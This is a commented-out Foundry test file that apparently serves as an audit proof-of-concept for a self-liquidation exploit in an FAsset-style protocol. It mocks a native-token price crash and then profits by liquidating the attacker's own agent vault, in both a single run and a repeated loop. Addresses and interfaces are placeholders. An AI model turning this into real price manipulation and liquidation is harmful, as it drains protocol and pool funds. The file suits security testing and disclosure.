// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";
// import "forge-std/console.sol";

// contract SelfLiquidationExploit is Test {
//     IAssetManager public assetManager;
//     IERC20 public wNAT;
//     IERC20 public fAsset;
//     address public agentVault;
//     address public exploiter;

//     function setUp() public {
//         // Setup contracts and initial state
//         assetManager = IAssetManager(/* address */);
//         wNAT = IERC20(/* address */);
//         fAsset = IERC20(/* address */);
//         exploiter = makeAddr("exploiter");
//         agentVault = makeAddr("agentVault");

//         // Fund exploiter with initial capital
//         deal(address(wNAT), exploiter, 1000000e18);
//     }

//     function testSelfLiquidationProfit() public {
//         vm.startPrank(exploiter);

//         // Step 1: Become an agent and mint fAssets
//         uint256 initialCollateral = 100000e18; // 100k wNAT
//         uint256 mintedFAssets = _becomeAgentAndMint(initialCollateral);

//         uint256 initialWNATBalance = wNAT.balanceOf(exploiter);
//         uint256 initialFAssetBalance = fAsset.balanceOf(exploiter);

//         console.log("Initial balances:");
//         console.log("WNAT:", initialWNATBalance);
//         console.log("fAssets:", initialFAssetBalance);

//         // Step 2: Manipulate NAT price downward (simulate market dip)
//         _simulateNatPriceCrash();

//         // Step 3: Verify pool collateral is underwater
//         (uint256 vaultCR, uint256 poolCR) = assetManager.getAgentCollateralRatios(agentVault);
//         console.log("Collateral Ratios after price crash:");
//         console.log("Vault CR:", vaultCR);
//         console.log("Pool CR:", poolCR);

//         require(poolCR < 10000, "Pool collateral not underwater");

//         // Step 4: Self-liquidate
//         uint256 liquidateAmount = mintedFAssets / 2; // Liquidate half position
//         _selfLiquidate(liquidateAmount);

//         // Step 5: Calculate profit
//         uint256 finalWNATBalance = wNAT.balanceOf(exploiter);
//         uint256 finalFAssetBalance = fAsset.balanceOf(exploiter);

//         console.log("Final balances:");
//         console.log("WNAT:", finalWNATBalance);
//         console.log("fAssets:", finalFAssetBalance);

//         uint256 wnatProfit = finalWNATBalance - initialWNATBalance;
//         uint256 fAssetLossValue = _convertFAssetToWNAT(initialFAssetBalance - finalFAssetBalance);

//         console.log("WNAT Profit:", wnatProfit);
//         console.log("FAsset Loss (WNAT value):", fAssetLossValue);

//         // Assert profitable exploit
//         assert(wnatProfit > fAssetLossValue);
//         console.log("EXPLOIT SUCCESSFUL: Profit of", wnatProfit - fAssetLossValue, "WNAT");

//         vm.stopPrank();
//     }

//     function testRepeatedExploit() public {
//         vm.startPrank(exploiter);

//         // Demonstrate the attack can be repeated
//         for (uint i = 0; i < 3; i++) {
//             console.log("\n=== Exploit Cycle", i + 1, "===");

//             // Setup agent position
//             uint256 collateral = 50000e18;
//             uint256 minted = _becomeAgentAndMint(collateral);

//             uint256 initialWNAT = wNAT.balanceOf(exploiter);

//             // Trigger price dip and self-liquidate
//             _simulateNatPriceCrash();
//             _selfLiquidate(minted / 2);

//             uint256 profit = wNAT.balanceOf(exploiter) - initialWNAT;
//             console.log("Cycle", i + 1, "profit:", profit, "WNAT");

//             // Reset for next cycle (optional - could compound)
//             _resetAgentPosition();
//         }

//         vm.stopPrank();
//     }

//     // Helper functions
//     function _becomeAgentAndMint(uint256 _collateral) internal returns (uint256 mintedFAssets) {
//         // Setup agent vault and deposit collateral
//         wNAT.approve(address(assetManager), _collateral);
//         assetManager.createAgentVault(_collateral);

//         // Mint fAssets against collateral
//         uint256 maxMintable = assetManager.maxMintableFAssets(agentVault);
//         mintedFAssets = maxMintable * 80 / 100; // Mint 80% of capacity

//         assetManager.mintFAssets(agentVault, mintedFAssets, exploiter);
//         return mintedFAssets;
//     }

//     function _simulateNatPriceCrash() internal {
//         // Method 1: Direct price feed manipulation (if possible)
//         vm.mockCall(
//             address(assetManager.priceFeed()),
//             abi.encodeWithSignature("getPrice()"),
//             abi.encode(5e17) // 50% price drop
//         );

//         // Method 2: Simulate market sell pressure
//         // This would require access to DEX pools in real scenario
//         address[] memory nATPairs = _getNATDEXPools();
//         for (uint i = 0; i < nATPairs.length; i++) {
//             _simulateLargeSell(nATPairs[i]);
//         }

//         // Force price update in the system
//         assetManager.updatePrices();
//     }

//     function _selfLiquidate(uint256 _amount) internal {
//         // Call liquidation as the agent owner
//         assetManager.liquidate(agentVault, _amount);
//     }

//     function _convertFAssetToWNAT(uint256 _fAssetAmount) internal view returns (uint256) {
//         // Convert fAsset amount to equivalent WNAT value
//         uint256 fAssetPrice = assetManager.getFAssetPrice();
//         uint256 natPrice = assetManager.getNatPrice();
//         return (_fAssetAmount * fAssetPrice) / natPrice;
//     }

//     function _resetAgentPosition() internal {
//         // Clean up agent position for next exploit cycle
//         assetManager.closeAgentVault(agentVault);
//     }

//     // Utility functions for price manipulation simulation
//     function _getNATDEXPools() internal pure returns (address[] memory) {
//         // Return addresses of major NAT trading pairs
//         address[] memory pools = new address[](3);
//         pools[0] = 0x...; // NAT/USDC pool
//         pools[1] = 0x...; // NAT/USDT pool
//         pools[2] = 0x...; // NAT/ETH pool
//         return pools;
//     }

//     function _simulateLargeSell(address _pool) internal {
//         // Simulate large sell order affecting price
//         // In real exploit, this would be actual trades
//         vm.mockCall(
//             _pool,
//             abi.encodeWithSignature("getReserves()"),
//             abi.encode(1000e18, 500000e6, block.timestamp) // Imbalanced reserves
//         );
//     }
// }

// // Mock interfaces
// interface IAssetManager {
//     function createAgentVault(uint256 _collateral) external;
//     function mintFAssets(address _agentVault, uint256 _amount, address _recipient) external;
//     function liquidate(address _agentVault, uint256 _amountUBA) external returns (uint256, uint256, uint256);
//     function getAgentCollateralRatios(address _agentVault) external view returns (uint256, uint256);
//     function maxMintableFAssets(address _agentVault) external view returns (uint256);
//     function updatePrices() external;
//     function getFAssetPrice() external view returns (uint256);
//     function getNatPrice() external view returns (uint256);
//     function closeAgentVault(address _agentVault) external;
//     function priceFeed() external view returns (address);
// }

// interface IERC20 {
//     function balanceOf(address account) external view returns (uint256);
//     function approve(address spender, uint256 amount) external returns (bool);
// }